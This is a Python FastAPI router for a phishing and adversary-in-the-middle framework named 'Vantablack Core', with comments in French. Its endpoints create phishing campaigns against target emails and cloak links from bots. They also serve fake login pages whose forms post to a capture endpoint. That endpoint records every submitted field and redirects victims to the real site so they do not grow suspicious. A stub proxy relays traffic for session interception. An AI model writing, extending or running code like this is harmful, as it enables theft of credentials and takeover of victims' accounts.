from fastapi import APIRouter, HTTPException, Response, Request, Depends, status, Form
from fastapi.responses import RedirectResponse, HTMLResponse
from typing import Dict, List, Optional
from core.common.metrics import MetricsManager
from core.common.config import sanitized
from core.cache.redis_manager import redis_cache
from core.security.rate_limiter import rate_limiter
from core.redirect.smart_redirector import smart_redirector
from core.social.manager import social_manager
from core.proxy.aitm import aitm_proxy
from core.session.session_manager import session_manager

router = APIRouter(prefix="/v5", tags=["Vantablack Core"])

# --- Core Management ---

@router.get("/config")
@redis_cache.cached("app_config", expire=60)
async def get_config():
    """Récupère la configuration sécurisée (cachée)."""
    return {"config": sanitized()}

@router.get("/metrics")
async def get_metrics():
    """Récupère les métriques système."""
    return MetricsManager().get_all_metrics()

# --- Smart Redirection & AiTM ---

@router.get("/r/{campaign_id}")
async def smart_redirect(campaign_id: str, request: Request):
    """
    Smart Redirection Endpoint (Tier 2 Logic)
    Analyse le trafic entrant, filtre les bots, et redirige vers la landing page ou le decoy.
    """
    try:
        result = await smart_redirector.process_request(request, campaign_id)
        
        if isinstance(result, RedirectResponse):
            return result
        
        # Si c'est un dict, c'est que l'accès est autorisé
        if isinstance(result, dict) and "redirect_to" in result:
             return RedirectResponse(url=result["redirect_to"], status_code=status.HTTP_302_FOUND)
            
        return result
    except Exception as e:
        # En cas d'erreur interne, fail-safe vers decoy pour ne pas exposer d'erreur
        print(f"[SmartRedirect Error] {e}")
        return RedirectResponse(url="https://www.google.com", status_code=status.HTTP_302_FOUND)

@router.get("/health")
@redis_cache.cached("health_check", expire=60)
async def health_check():
    """Vérification de santé (cachée)."""
    return {"status": "ok", "version": "5.0.0-Clean"}

# --- Social Engineering Campaigns ---

@router.post("/campaigns/create")
async def create_campaign(name: str = Form(...), template_id: str = Form(...), target_email: Optional[str] = Form(None)):
    """Crée une nouvelle campagne de phishing."""
    try:
        campaign = social_manager.create_campaign(name, template_id, target_email)
        return {"status": "success", "campaign": campaign}
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

@router.get("/campaigns/templates")
async def list_templates():
    """Liste les templates disponibles."""
    return {"templates": social_manager.list_templates()}

@router.get("/phish/{campaign_id}/login")
async def serve_phishing_page(campaign_id: str, request: Request, sid: Optional[str] = None):
    """Sert la page de phishing (Template Mode)."""
    # Vérification basique de la session si fournie
    if sid:
        session = session_manager.get_session(sid)
        if not session:
             # Session invalide -> Redirection vers decoy ou nouvelle session
             return RedirectResponse(url="/v5/r/" + campaign_id)
    
    content = social_manager.get_template_content(campaign_id)
    # Injection du session_id dans le formulaire pour le tracking
    if sid:
        content = content.replace('<form action="/auth/login" method="POST">', 
                                  f'<form action="/v5/auth/login?sid={sid}" method="POST">')
    else:
        content = content.replace('<form action="/auth/login" method="POST">', 
                                  f'<form action="/v5/auth/login?cid={campaign_id}" method="POST">')
        
    return HTMLResponse(content=content)

@router.post("/auth/login")
async def capture_credentials(request: Request, sid: Optional[str] = None, cid: Optional[str] = None):
    """
    Endpoint de capture des identifiants (Form POST).
    Redirige ensuite vers le vrai site (ou une page d'erreur).
    """
    form_data = await request.form()
    
    session_id = sid
    if not session_id and cid:
        # Création d'une session à la volée si pas de SID
        session_id = session_manager.create_session(cid, request.client.host, request.headers.get("user-agent", ""))
    
    if session_id:
        # Capture des données
        for key, value in form_data.items():
            session_manager.capture_credential(session_id, key, value)
            
        print(f"[CAPTURE] Credentials captured for session {session_id}")
        
        # Récupération de l'URL cible pour redirection finale
        session = session_manager.get_session(session_id)
        campaign_id = session.get("campaign_id") if session else cid
        
        target_url = "https://google.com" # Fallback
        if campaign_id:
            campaign = social_manager.get_campaign(campaign_id)
            if campaign:
                target_url = campaign.get("target_url", target_url)
        
        # Redirection vers le vrai site pour éviter les soupçons
        return RedirectResponse(url=target_url, status_code=status.HTTP_302_FOUND)
        
    return RedirectResponse(url="https://google.com", status_code=status.HTTP_302_FOUND)

# --- AiTM Proxy (Experimental) ---

@router.api_route("/proxy/{path:path}", methods=["GET", "POST", "PUT", "DELETE"])
async def aitm_proxy_endpoint(path: str, request: Request):
    """
    Endpoint AiTM Proxy générique.
    Nécessite une configuration DNS avancée pour être efficace.
    """
    # Cible hardcodée pour démo (à dynamiser via session/domaine)
    target_base = "https://example.com" 
    
    # Récupération session via cookie ou query
    session_id = request.query_params.get("sid")
    
    body = await request.body()
    
    return await aitm_proxy.proxy_request(f"{target_base}/{path}", request, session_id, body)
